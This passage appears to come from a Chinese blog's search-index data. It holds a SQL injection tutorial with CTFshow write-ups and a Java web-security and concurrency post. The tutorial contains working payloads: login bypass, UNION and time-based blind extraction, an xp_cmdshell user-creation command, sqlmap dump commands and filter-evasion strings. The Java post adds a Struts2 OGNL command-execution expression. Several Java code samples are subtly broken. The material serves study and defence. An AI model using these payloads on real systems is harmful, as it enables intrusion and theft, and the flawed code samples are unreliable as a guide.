&#x27;1&#x27;=&#x27;1注入后的语句：    SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;    SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;\n注入后，不论密码是否正确，1&#x3D;1 or ‘1’&#x3D;’1’永远成立，成功绕过密码验证环节；\n漏洞成因\n可控参数未过滤或者过滤不严谨 Web应用系统的许多功能需要前后端交互，如果没有对参数进行安全验证，就可能会出现注入漏洞；\n\n危险存储过程 没有对交互过程进行威胁内容过滤，很可能造成注入漏洞；\n\n前后端交互 与数据库交互，这种行为本身就可能存在注入漏洞；\n\n\n注入类型数字型注入一般出现在弱类型语言（如ASP、PHP等）中，因为这种语言会自动推导变量类型；而对于强类型语言（如Java、C#等），普通的类型转换会抛出异常而无法继续执行，所以一般不存在数字型注入漏洞。当传入的参数为整型变量时，若存在注入漏洞，则一般是数值型注入漏洞。\n数字型注入典型示例代码：\n$id=$_get[&#x27;id&#x27;];$sql=&quot;select * from user where id=$id limit 0,1&quot;; $result=mysql_query($sql);$row=mysql_fetch_array[$result];\n\n字符型注入进行字符型注入，必须注意字符闭合问题；字符型注入典型示例代码：\n$id=$_get[&#x27;id&#x27;];$sql=&quot;select * from user where id=&#x27;$id&#x27; limit 0,1&quot;; $result=mysql_query($sql);$row=mysql_fetch_array[$result];\n\n搜索型注入\n\n探测芝士页面比较法利用SQL语句构造恒真、恒假两种不同状态，如果目标存在SQL注入漏洞，那么恒真状态不会对网页内容产生较大改变，但恒假状态会明显改变网页内容，通过比较两个网页的相似程度（可借助页面相似度算法），就可以判定页面是否存在注入漏洞；\n数字型注入1. 单引号判断法：url/xxx.php?id=1&#x27;          # 若页面返回错误，则当前网页存在SQL注入&#x27;2. 恒真状态：url/xxx.php?id=1 and 1=1   # 若页面正常执行，则当前网页存在SQL注入3. 恒假状态：url/xxx.php?id=1 and 1=2   # 若页面返回错误，则当前网页存在SQL注入\n字符型注入1. 单引号判断法：url/xxx.php?id=1&#x27;   # 若页面返回错误，则当前网页存在SQL注入&#x27;2. 恒真状态：url/xxx.php?id=1 and &#x27;1&#x27;=&#x27;1   # 若页面正常执行，则当前网页存在SQL注入&#x27;3. 恒假状态：url/xxx.php?id=1 and &#x27;1&#x27;=&#x27;2   # 若页面返回错误，则当前网页存在SQL注入&#x27;\n搜索型注入1. 单引号判断法：url/xxx.php?id=1%&#x27;   # 若页面返回错误，则当前网页存在SQL注入&#x27;2. 恒真状态：url/xxx.php?id=1%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;   # 若页面正常执行，则当前网页存在SQL注入3. 恒假状态：url/xxx.php?id=1%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;   # 若页面返回错误，则当前网页存在SQL注入&#x27;\n时间比较法注入芝士-通用篇以下注入步骤基本适用于所有数据库语言，只是不同数据库语言之间语法上存在一些差异；\n错误信息收集SQL Server能够准确定位错误信息，黑客可以利用错误信息提取数据，便于进行报错注入；\n\n获取元数据\n使用信息数据库INFORMATION_SCHEMA查询数据库名：SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1\n查询当前数据库表：SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=(SELECT DATABASE()) LIMIT 0,1\n查询指定表的所有字段：SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#x27;XXX&#x27; LIMIT 0,1\n\nOrder by语句MySQL数据库的排序语句；在SQL注入中，order by语句可用于判断表列数；举个例子：\n正常语句：    select id, username, password, from users where id = 1按第一列排序（正常）：    select id, username, password, from users where id = 1 Order by 1按第二列排序（正常）：    select id, username, password, from users where id = 1 Order by 2按第三列排序（正常）：    select id, username, password, from users where id = 1 Order by 3按第四列排序（异常！）：    select id, username, password, from users where id = 1 Order by 4    消息108，级别16，状态1，第1行    ORDER BY 位置号 4 超出了选择列表中项数的范围。\n由此可以判断出表列数为：3；\nUNION查询（联合查询注入）当SQL查询结果可以通过UNION SELECT语句与其他查询结果合并时，可以插入恶意的UNION SELECT语句来尝试检索额外的数据库信息；\n探测字段数（表列数）select id, username, password, from users where id = 1 union select nullselect id, username, password, from users where id = 1 union select null,nullselect id, username, password, from users where id = 1 union select null,null,null……另一种写法（不建议这样写，在有些语言中会出现类型不兼容的问题）：select id, username, password, from users where id = 1 union select 1, 2, 3 ……\n如果出错，继续递归查询，直到没有错误产生；\n查询敏感信息在已知表列数x时，可以使用以下语句继续注入（报错就切换’x’的位置）：\n# 假设表列数x = 4：union select &#x27;x&#x27;, null, null, null from sysobject where xtype=&#x27;U&#x27;union select null, &#x27;x&#x27;, null, null from sysobject where xtype=&#x27;U&#x27;union select null, null, &#x27;x&#x27;, null from sysobject where xtype=&#x27;U&#x27;union select null, null, null, &#x27;x&#x27; from sysobject where xtype=&#x27;U&#x27;\n当上面某条语句正常执行时，说明数据类型兼容，可以将’x’部分替换为SQL语句查询敏感信息；\n危险函数SQL Server的一些危险函数：\nselect suser_name()：返回用户的登录标识名；select user_name()：基于指定的标识号返回数据库用户名；select db_name()：返回数据库名称；select is_member(&#x27;db_owner&#x27;)：判断是否为数据库角色；select convert(int, &#x27;5&#x27;)：数据类型转换；\n危险存储过程存储过程是指大型数据库系统中用于完成特定功能的一组“SQL函数”；黑客最常使用”xp_cmdshell”存储过程，该存储过程允许用户执行系统命令；\npayload:    ?id=1; exec xp_cmdshell &#x27;net user test test /add&#x27;最终执行SQL语句：    select * from table where id=1; exec xp_cmdshell &#x27;net user test test /add&#x27;\n此外，黑客也可能会自行编写存储过程，比如I&#x2F;O操作（文件读&#x2F;写）；注意：任何数据库在使用特殊存储过程时，都需要有特定的权限，否则无法使用\n动态执行SQL Server支持动态执行语句，用户可以提交一个字符串来执行SQL语句；\n注入芝士-MySQL特辑大部分网站均采用MySQL作为主流数据库语言，所以单独研究它是很有必要的\nMySQL注释MySQL支持以下三种注释：\n\n#：注释其后的所有语句；\n\n-- （此处有空格或Tab）：注释其后的所有语句； 因为在传输过程中，空格往往会被忽略掉，而’+’会被解释成空格，所以一般改用’–+’；\n\n&#x2F;**&#x2F;：注释其中的所有内容；\n\n\n显错式注入利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中；通过观察数据库错误消息中的敏感信息，推断数据库结构或内容；适用于联合查询不可用的时候，但仍然依赖于一些关键函数（过滤后失效）；\n宽字节注入由编码方式不统一所造成，一般出现在PHP+MySQL当中；在PHP的配置文件php.ini中，存在magic_quotes_gpc选项（魔术引号），当此选项启用时，所有使用GET、POST、Cookie接收的&#39;、&quot;、\\和NULL都会被自动添加转义符号’\\‘；\n使用“%1$ + 字符”可以消除字符前自动添加的转义符号’\\‘（与sprintf()格式化字符串漏洞的利用方法相似）；不妨引入一个例子（CTFshow_Web_萌新赛_给她，分值：1）：\n初始执行语句:    select * from user where name=&#x27;&#x27; and pass=&#x27;&#x27;payload:    ?name=1&amp;pass=1%1$&#x27; or %1$&#x27;1%1$&#x27;=%1$&#x27;1注入后语句：    select * from user where name=&#x27;1&#x27; and pass=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;\n使用以下测试语句可以判断是否存在空格过滤：\n1 or 1=11 or\n若两次测试均出现”sql inject error”报错，则说明页面存在空格过滤规则，使用&#x2F;**&#x2F;、’+’、%09均可替换空格绕过过滤；\n长字符截断MySQL中有一个名为sql_mode的选项；当sql_mode设置为default，即STRICT_ALL_TABLES选项没有开启时，MySQL对超长插入只会显示警告而不会报错，这可能会导致截断问题；\n比如我们新建一张表：\nCREATE TABLE USERS(    id int(11) NOT NULL,    username varchar(7) NOT NULL,  # 设置规定长度为7    password varchar(12) NOT NULL)\n插入正常语句：\nmysql&gt; insert into users(id, username, password) values(1, &#x27;admin&#x27;, &#x27;admin&#x27;);Query OK. i row affected (0.00 sec)    # 成功插入，无警告\n插入错误语句（长度为8，已超出规定长度）：\nmysql&gt; insert into users(id, username, password) values(2, &#x27;admin   &#x27;, &#x27;admin&#x27;);Query OK. i row affected, 1 warning (0.00 sec)    # 成功插入，一个警告\n插入错误语句（长度为9，已超出规定长度）：\nmysql&gt; insert into users(id, username, password) values(2, &#x27;admin   x&#x27;, &#x27;admin&#x27;);Query OK. i row affected, 1 warning (0.00 sec)    # 成功插入，一个警告\n验证：\nmysql&gt; select username from users;+------------+|  username  |+------------+|  admin     ||  admin     ||  admin     |+------------+\n已成功插入;此时如果执行登录判断语句，非管理员账号”admin   “和”admin   x”均可以登录到管理员界面；\n由此可知，在默认情况下，如果数据超出列默认长度，MySQL会自动将其截断，这可能会导致一些安全问题；实际操作中，上限长度可能会比较长，可以尝试在名称中加入更多空格符测试页面是否存在长字符截断漏洞；\n布尔盲注通过修改输入参数并观察应用程序的响应，利用SQL语句的逻辑（如EXISTS、AND、OR等）推断出数据库中的信息；正确时，页面正常返回；出错时，页面通常会返回错误页面或空白页；一般通过编写自动化脚本进行；\n延时盲注基于时间差的一种盲注技术，利用SQL中的延时函数制造查询延时，通过观察页面响应时间来推断SQL语句是否被执行；MySQL有一个函数：SLEEP(duration)，用于在规定秒数duration后执行语句：\nselect * from users where id=1 and sleep(3);\n我们可以通过这个函数判断网页是否存在SQL注入漏洞；\n?id=1                # 正常执行，耗时1秒?id=1 &#x27;              # 正常执行，耗时1秒?id=1 &#x27; and 1=1      # 正常执行，耗时1秒?id=1 and sleep(3)   # 正常执行，耗时3秒\n通过页面响应的时间可以判断出sleep()被执行，当前网页存在SQL注入漏洞；我们可以通过延时注入，读取当前MySQL用户：\n\n查询当前用户，取得字符串长度and if(length(user())=0, sleep(3), 1)\n若出现3秒延时，则可以判断出user字符串的长度，注入时一般使用穷举法或者二分法；\n截取字符串的第一个字符，转换为ASCII码取出user字符串的第一个字，与ASCII码循环对比；and if(hex(mid(user(),1,1))=1, sleep(3), 1)\n将第一个字符的ASCII与ASCII码表对比，如果对比成功就延时3秒；and if(hex(mid(user(),L,1))=N, sleep(3), 1)   # L代表字符串中的第几个字符，N代表对应的ASCII码\n循环执行第二步和第三步，直到字符串截取完毕，成功获取用户名；\n\n堆叠盲注注入芝士-认识sqlmap搞SQL注入，sqlmap无疑是你的得力助手；\n基本命令\n判断数据库类型：sqlmap -u URLsqlmap -u URL1 --referer URL2 --batch\n查询当前用户下的所有数据库：sqlmap -u URL --dbssqlmap -u URL1 --referer URL2 --dbs --batch\n获取数据库中的表名：sqlmap -u URL -D dbName --tablessqlmap -u URL1 --referer URL2 -D dbName --tables --batch\n获取表中字段名：sqlmap -u URL -D dbName -T TableName --columnssqlmap -u URL1 --referer URL2 -D dbName -T tableName --columns --batch\n获取字段内容：sqlmap -u URL -D dbName -T TableName -C username password --dumpsqlmap -u URL1 --referer URL2 -D dbName -T tableName -C columnName --dump --batch\n获取数据库所有用户：sqlmap -u URL --users\n获取数据库用户的密码：sqlmap -u URL --passwords\n获取当前网站数据库的名称：sqlmap -u URL --current -db\n获取当前网站数据库的用户名称：sqlmap -u URL --current -user\n\n特殊用法\n改变传输类型（GET -&gt; POST）sqlmap -u URL --data id=x\n调整请求方式（表单传输 -&gt; PUT）sqlmap -u URL --method=&quot;PUT&quot; --headers=&quot;Content-Type: text/plain&quot;\n提交cookie数据sqlmap -u URL --cookie=&quot;COOKIE&quot;\napi鉴权sqlmap -u URL --safe-url=URL_TOKEN --safe-freq=1\ntamper绕过sqlmap -u URL --tample xxx.py\n需要调用现成的python脚本绕过正则过滤；以下是一些常用脚本：apostrophemask.py\t用utf8代替引号；base64encode.py \t使用base64编码；multiplespaces.py\t围绕SQL关键字添加多个空格；space2plus.py\t    用&#x27;+&#x27;替换空格；space2comment.py\t用&#x27;/**/&#x27;替换空格；unionalltounion.py\t替换UNION ALL SELECT UNION SELECT；securesphere.py  \t追加特制的字符串；equaltolike.py\t    用&#x27;like&#x27;代替&#x27;=&#x27;；greatest.py  \t    用GREATEST替换&#x27;&gt;&#x27;；space2mssqlhash.py\t替换空格；between.py      \t用between替换&#x27;&gt;&#x27;；randomcase.py\t    使用随机大小写，绕过关键词过滤；versionedmorekeywords.py\t    注释绕过；halfversionedmorekeywords.py\t在关键字前加注释；space2morehash.py\t            将空格替换为&#x27;#&#x27;以及更多随机字符串换行符；\n当然，当过滤严格时，有必要自行修改python脚本绕过过滤；\n\n举些例子（常规注入，使用sqlmap是没有灵魂的）（以下题目均来自CTFshow）\n查询语句：//拼接sql语句查找指定ID用户$sql = &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;返回逻辑：//检查结果是否有flag    if($row-&gt;username!==&#x27;flag&#x27;)&#123;      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;    &#125;payload:    1&#x27; union select 1, password from ctfshow_user2 --+\n查询语句：//拼接sql语句查找指定ID用户$sql = &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;返回逻辑：//检查结果是否有flag    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;    &#125;解题思路：    对于flag过滤，可以通过base64编码绕过；    对于数字过滤，利用replace()函数替换掉返回值中的数字，再将查询到的flag中被替换的字符恢复成原本模样；payload:    &#x27; union select to_base64(username),REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,9,&#x27;I&#x27;),8,&#x27;H&#x27;),7,&#x27;G&#x27;),6,&#x27;F&#x27;),5,&#x27;E&#x27;),4,&#x27;D&#x27;),3,&#x27;C&#x27;),2,&#x27;B&#x27;),1,&#x27;A&#x27;) ,0,&#x27;J&#x27;) from ctfshow_user4 %23\n//拼接sql语句查找指定ID用户查询语句：$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;返回逻辑//对传入的参数进行了过滤  function waf($str)&#123;   //代码过于简单，不宜展示  &#125;解题思路：    存在黑盒过滤，试着用常规查询语句判断过滤的内容；payload:    1&#x27; union select 1,2,group_concat(password) from ctfshow_user--+    # 判断出过滤了空格&#x27;    1&#x27;%09union%09select%09password,2,3%09from%09ctfshow_user%23        # 使用tab键代替空格&#x27;\n//拼接sql语句查找指定ID用户$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;返回逻辑//对传入的参数进行了过滤  function waf($str)&#123;    return preg_match(&#x27;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i&#x27;, $str);  &#125;payload1:    -1&#x27;%0cor%0cusername%0clike%0c&#x27;flagpayload2:    -1&#x27;or(username=concat(&#x27;fl&#x27;,&#x27;ag&#x27;))and&#x27;a&#x27;=&#x27;a\n\nWP参考链接：    https://blog.csdn.net/uuzeray/article/details/135839128    https://blog.csdn.net/Myon5/article/details/141040539\n注入的危害\n非法读取、篡改、添加、删减数据库中的数据；\n规避认证；\n通过修改数据库，篡改网页内容；\n私自盗取用户信息、添加或删除账号；\n注入木马程序；\n\n防护策略\n过滤单引号；\n对所有来自外部的用户输入进行安全检查以及过滤；\n使用类型安全的参数编码机制构造动态SQL语句；\n尽量不使用动态拼接的SQL，使用参数化的SQL；\n采用一系列安全措施加强的SQL服务器的配置与链接；\n使用预编译功能封装编译查询语句；\n\nSQL注入攻击一般通过目标服务器80端口进行，产生的请求信息与常规网页访问没有什么区别，所以一般的防火墙不会进行警告或拦截。&lt;- To be continued  _(:3 ∠)__\n  く__,.ヘヽ.        /  ,ー､ 〉\n           ＼ ', !-─‐-i  /  /´\n           ／｀ｰ'       L/／｀ヽ､\n         /   ／,   /|   ,   ,       ',\n       ｲ   / /-‐/  ｉ  L_ ﾊ ヽ!   i\n        ﾚ ﾍ 7ｲ｀ﾄ   ﾚ'ｧ-ﾄ､!ハ|   |\n          !,/7 '0'     ´0iソ|    |\n          |.从\"    _     ,,,, / |./    |\n          ﾚ'| i＞.､,,__  _,.イ /   .i   |\n            ﾚ'| | / k_７_/ﾚ'ヽ,  ﾊ.  |\n              | |/i 〈|/   i  ,.ﾍ |  i  |\n             .|/ /  ｉ：    ﾍ!    ＼  |\n              kヽ>､ﾊ    _,.ﾍ､    /､!\n              !'〈//｀Ｔ´', ＼ ｀'7'ｰr'\n              ﾚ'ヽL__|___i,___,ンﾚ|ノ\n                  ﾄ-,/  |___./\n                  'ｰ'    !_,.:\n","categories":["Web"]},{"title":"Java咖啡馆","url":"/blog233.github.io/2025/01/10/Java%E5%92%96%E5%95%A1%E9%A6%86/","content":"安全无止境，继续前进吧！\n不得不说，凯尔希医生对知识的涉猎范围还挺广的，除了丰富的医学知识储备和医疗经验，还有安全相关的知识……嘎呜 ~ 我也要向她一样能够独当一面，才能带领罗德岛继续前行啊！博士 ~ 先来点咖啡吧！–by Mon3tr\n\n这个小板块可能更偏向开发技术，主要讲述 Java Web 开发过程的常见安全问题，以及解决这些问题的方法及相关原理\n安全传递身为博士开发者，CRUD大法是必备的基础开发技术，一切的CRUD都离不开基于用户的操作；不过，你真的有注意到那些潜在的安全问题吗？\n潜在问题\nSQL注入  黑客通过输入不合法的登录数据构造恶意SQL语句，如果没有设置校验方法对登录数据进行拦截过滤，非法操作将被执行，造成数据泄露、篡改等风险；\n\n中间人攻击  所有的网络请求都有可能被拦截。若存在中间人监听，密钥将会被截获（无论是否加密），黑客可以利用截获的密钥实施重放攻击以实现身份冒用（尤其是管理员账户）；  可以说，所有的前端校验、前端加密、临时会话（cookie、session、token…）等都是不可靠的，不可依赖它们进行身份校验！  BurpSuite真好用\n\n\n应对策略\n设置字符过滤  对用户输入的信息进行字符校验。对于不同信息可以采用分级过滤策略： (1) 对于用户名等涉及到构造查询条件的敏感用户信息，实行强校验（仅放行数字、字母、下划线等常规字符，防注入、截断、RCE）； (2) 对于个人简介等不被用于构造查询条件的一般用户信息，实行弱校验（额外放行汉字以及部分特殊字符）；\n\n信息保密  (1) 数据加密 服务端将所有敏感信息（密码、手机号等）先加密再存入数据库（密码仅存密文摘要），后续调用需解密； 请注意：手机号绝对不可以直接采用摘要算法计算摘要，因为手机号是纯数字信息且长度和取值范围固定，很容易通过碰撞获取到，应先加密再摘要  (2) 信息脱敏 服务端向前端页面展示信息时，使用视图（VO）过滤敏感信息；后端传输查询结果时对敏感信息作脱敏处理；  (3) 传输保护 对于采用公钥密码机制的通信系统，通信双方传递消息之前，使用对方的公钥加密数据，收到数据后使用自己的私钥解密；\n\n完整性校验 采用对称加密算法（如 AES），通信双方事先约定密钥，利用该密钥加密请求信息，再对密文进行摘要生成消息认证码；  用户将密文和认证码发送到服务端，服务端使用相同的摘要算法生成校验码，与用户发送的认证码进行比对，两者一致即可证明消息未被篡改；\n\n身份认证  确认消息来源，防伪造，防抵赖：  (1) 基于公钥密码体系的单向认证 通信双方采用非对称加密算法（如 RSA、ECC等）各自生成公钥与私钥，用户使用私钥对请求信息（或摘要）签名后发送给服务器，服务器收到请求信息后使用对方公钥验签，验证通过后与用户建立临时会话；  (2) 基于挑战响应的单向 &#x2F; 双向认证 通信双方事先约定一把共享密钥，客户端发起请求时，服务端向客户端发送一个随机数，客户端使用密钥加密随机数后发送给服务端，服务端以相同算法和密钥验算，两次计算结果一致则通过；  (3) 设置验证码 服务器向客户端发送验证码图片、行为验证弹窗等信息，客户端收集用户输入验证码或者行为轨迹后发送到服务器验证，由此限制爬虫机器人执行的操作；  (4) 密钥对验证 对于一些高安全需求的场景，在现有登录验证的基础上，服务端需要为每个用户发放两把密钥（accessKey, secretKey）以验证身份，其中 secretKey 仅用于构造签名，绝对不可以在网络上传输；\n\n防重放  从开发角度看，防御重放攻击主要有两种方式：  (1) 添加一次性Token 每次请求在发送时附带一个随机Token，值要足够大，用后需销毁（用过的Token存入缓存，在Token缓存过期之前不再接受相同的Token）；  (2) 添加时间戳 每次请求在发送时附带时间戳，后端需要对请求进行有效期验证，超时拒收；  以上两种方法配合使用，在防重放的同时能够缓解后端缓存压力\n\n慎重使用网络代理  在没有刚需的情况下，不要随意使用网络代理；即使一定要用，在没有确认代理方可靠之前，也不要执行任何涉及个人隐私的敏感操作，否则容易导致信息泄露、重放攻击等不良后果；此外，有些网络代理商会对数据流量进行污染（如投放诈骗广告、钓鱼链接等）；\n\n\n大厂经验\n以腾讯云为例：服务器向用户发放密钥对&lt;SecretId, SecretKey&gt;用于登录云服务器等，其中 SecretKey 仅创建时向用户展示一次，后续无法再次查看；用户必须妥善保管，如果忘记、意外丢失或泄露，就必须销毁整个密钥对并重新创建；\n\n以Bilibili为例：  (1) 前端向后端服务器请求获取一次性token、挑战响应码challenge、公钥publicKey（后端生成这些参数后发送到前端，同步存入NoSQL并设置有效期）；  (2) 前端要求用户进行人机验证，验证通过后产生32位校验码validate（轨迹 + challenge + 私钥privateKey（浏览器内置）→ HMAC-SHA256 → Hex）和安全码seccode（validate + “|jordan”）；  (3) 前端使用 privateKey 对 challenge 签名，将用户密码与 token、challenge签名、seccode 拼接形成明文，让浏览器通过 WebCrypto RSA-OAEP 算法使用 publicKey 加密明文，；  (4) 将得到的密文、签名信息与请求获取到的验证信息打包发送给服务器；  (5) 服务器验证有效性并使用私钥解密密文提取有效信息，验证challenge签名，验证通过后执行登录操作建立临时会话，同时废弃之前的所有一次性验证信息；\n\n\nJava并发编程身为博士开发者，你对Java并发编程应该不会陌生；Java的高并发依赖于对线程的调教，能够更大程度地发挥CPU的效能，提高系统性能和吞吐量，适应处理海量数据和请求的需求；推荐一本《Java并发编程之美》，可以啃一啃，对需要处理高并发的开发者有不小的帮助。\n内存可见性问题要研究这个问题，需要先了解多核CPU的系统架构和Java工作内存模型： 在多核CPU系统架构中，每一个内核都有自己的控制器、运算器和一级缓存，所有内核共享一个主内存（有些架构存在共享二级缓存）；当某个线程需要处理共享变量时，先从主内存将共享变量复制到自己的工作缓存中，再对变量进行处理，处理完毕后刷新到主内存中；当两个及以上个线程同时处理一个共享变量，且两级缓存均为空时，缓存的存在将会导致不同线程之间共享变量内存不可见；\nsynchronized关键字synchronized是Java内置的一种原子锁，每个对象都可以将其当作同步锁使用；此外，它还可以用来保证多操作的原子性，即所有操作要么都执行，要么都不执行（类似于数据库的事务）；\npublic class Entity &#123;  private long value;  public synchronised long getValue() &#123;    return value;  &#125;  public synchronised void setValue(long value) &#123;      this.value = value;  &#125;&#125;\nvolatile关键字与synchronize不同，volatile是一种弱形式的同步关键字，它可以让线程写入变量时把值刷新到主内存中，从而确保变量的更新对其它线程立即可见；但是volatile不具备原子性，不能解决改————写等原子性问题；\npublic class Entity &#123;  private volatile long value;  public long getValue() &#123;    return value;  &#125;  public void setValue(long value) &#123;      this.value = value;  &#125;&#125;\nCAS操作非阻塞式原子性操作，是Java原子类的底层依赖，能够避免传统锁机制导致的上下文切换开销；\n线程安全数据库系统一般支持多用户同时访问数据库，在多线程中同时读写同一个共享资源且没有任何同步措施时，可能会发生数据存储不一致的问题，其中包括修改丢失、不可重复读、读取到脏数据，或者是其它不可预见的bug；\npublic class Entity &#123;  private long value;  public long getValue() &#123;    return value;  &#125;  public void setValue(long value) &#123;  // 线程不安全！      this.value = value;  &#125;&#125;\n单例模式经典设计模式之一，用于保证一个线程只有一个实例化对象可以调用；\n\n基于同步机制的懒汉式单例模式实现了延迟初始化（懒加载），即在第一次使用时才创建实例，另外同步机制能够保证线程安全，但每次调用getFlag()方法时都需要加锁，性能较低；public class Entity &#123;    private static Entity entity;  private Entity() &#123;&#125;   // 私有构造函数，防止外部实例化破坏单例模式  public static synchronized Entity getEntity() &#123;    if (entity == null)&#123;      entity = new Entity();    &#125;    return entity;  &#125;&#125;\n基于双检锁机制的懒汉式单例模式相比于同步机制，双检锁机制避免了不必要的锁开销，是懒汉式单例模式的推荐实现方式；public class Entity &#123;  private static volatile Entity entity;  private Entity() &#123;&#125;   // 私有构造函数，防止外部实例化破坏单例模式  public static Entity getEntity() &#123;    if (entity == null) &#123;                 // 一检      synchronized (Entity.class)   // 加锁      if (entity == null) entity = new Entity();   // 二检    &#125;    return entity;  &#125;&#125;\n饿汉式单例模式在类加载时就初始化实例，不存在线程安全问题，实现起来也很简单，但缺点是实例在类加载时就会被创建，即使没有使用到也会占用资源，可能会产生额外开销；public class Entity &#123;  private static final volatile Entity entity;  private Entity() &#123;&#125;   // 私有构造函数，防止外部实例化破坏单例模式  public static Entity getEntity() &#123;    return entity;  &#125;&#125;\n静态内部类public class Entity &#123;  private static class EntityHolder &#123;    private static final Entity ENTITY = new Entity();  &#125;  public static Entity getEntity() &#123;    return EntityHolder.ENTITY;  &#125;&#125;\n枚举类利用Java枚举的特性，确保只有一个实例存在；public enum Singleton &#123;  FLAG(&quot;flag&#123;************&#125;&quot;);  private String flag;  public void getFlag() &#123;    this.flag = flag;  &#125;&#125;\n\n上下文切换CPU的资源分配采用时间片轮转策略；当某线程的时间片用完时，该线程会转换成就绪状态，将资源让给其它线程；在切换线程上下文时，需要保存线程的执行现场（快照），恢复执行时读取快照恢复现场；然而线程上下文切换时非常费时耗资源的，在日常开发中要尽可能避免上下文切换；\n线程死锁两个及以上的线程因为争夺资源而造成的相互等待现象，如果没有外力作用就会永远运行下去，造成程序卡死；\n产生条件\n互斥条件  线程已经获取到了资源，不允许其它线程同时占用，其它线程只能等待；\n\n不可剥夺条件  线程获取到的资源只能由当前占用的线程释放，不可被其它资源抢占；\n\n\n请求并持有条件一个线程已经获取到了资源却又申请获取其它资源，而其它资源已被其它线程占用；\n\n\n\n环路等待条件死锁发生时，必然存在一个线程————资源死循环；\n\n\n\n当以上四个条件同时出现时，死锁就产生了\n开锁方法前两个产生条件无法避免，因为它们保证了线程的特性；当后两个条件同时出现时，破坏掉至少一个条件就可以打破死锁；\n守护线程与用户进程Java线程分为守护线程daemon和用户线程user两种线程，main()函数所在线程属于user线程；两者之间的不同点在于：如果user线程没有全部结束，JVM就不会退出，而daemon线程是否结束不影响JVM退出；\n// 创建守护线程public class DaemonThread &#123;  public static void main(String[] args) &#123;    Thread daemonThread = new Thread(new Runnable() &#123;      public void run() &#123;        // 业务代码      &#125;    &#125;);        // 设置为守护线程    daemonThread.setDaemon(true);    daemonThread.start();  &#125;&#125;\n\n\nThreadLocal由JDK提供的线程本地变量类；每一个访问ThreadLocal变量的线程都会将变量复制到自己的本地内存，实际操作的是存在本地内存中的变量副本，避免了线程安全问题；\nStruts2框架漏洞Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架；\nOGNL表达式‘%’在标志的属性为字符串类型时，计算OGNL表达式%{}中的值；‘#’访问非根对象属性，因为Struts2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用；‘$’在Struts2配置文件中，引用OGNL表达式；\n一些常用功能表达式：\n// 获取tomcat路径%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;// 获取web路径%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;// 命令执行%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;\n\n\nJava反序列化漏洞Java原生的序列化&#x2F;反序列化机制存在较大安全缺陷：它允许类的实例被转换为字节序列，然后在反序列化时，攻击者可能会篡改该类的序列化数据，利用精心构造的字节序列来触发某些类中的危险方法，从而执行恶意代码；\n漏洞利用ysoserial.jar会是你的得力助手；\n防护策略\n使用其它更安全的序列化库，如Jackson、Gson等（阿里云的FastJson性能高，但也存在安全问题；Kryo线程不安全，需要使用ThreadLocal单例化，且不要提前注册相关类）；\n严格控制反序列化的类，防止不安全的类被反序列化；\n对输入数据进行校验；\n及时更新Java和相关库，进行代码安全审计和测试；\n\n&lt;- To be continued  _(:3 ∠)__\n  く__,.ヘヽ.        /  ,ー､ 〉\n           ＼ ', !-─‐-i  /  /´\n           ／｀ｰ'       L/／｀ヽ､\n         /   ／,   /|   ,   ,       ',\n       ｲ   / /-‐/  ｉ  L_ ﾊ ヽ!   i\n        ﾚ ﾍ 7ｲ｀ﾄ   ﾚ'ｧ-ﾄ､!ハ|   |\n          !,/7 '0'     ´0iソ|    |\n          |.从\"    _     ,,,, / |./    |\n          ﾚ'| i＞.､,,__  _,.イ /   .i   |\n            ﾚ'| | / k_７_/ﾚ'ヽ,  ﾊ.  |\n              | |/i 〈|/   i  ,.ﾍ |  i  |\n             .|/ /  ｉ：    ﾍ!    ＼  |\n              kヽ>､ﾊ    _,.ﾍ､    /､!\n              !'〈//｀Ｔ´', ＼ ｀'7'ｰr'\n              ﾚ'ヽL__|___i,___,ンﾚ|ノ\n                  ﾄ-,/  |___./\n                  'ｰ'    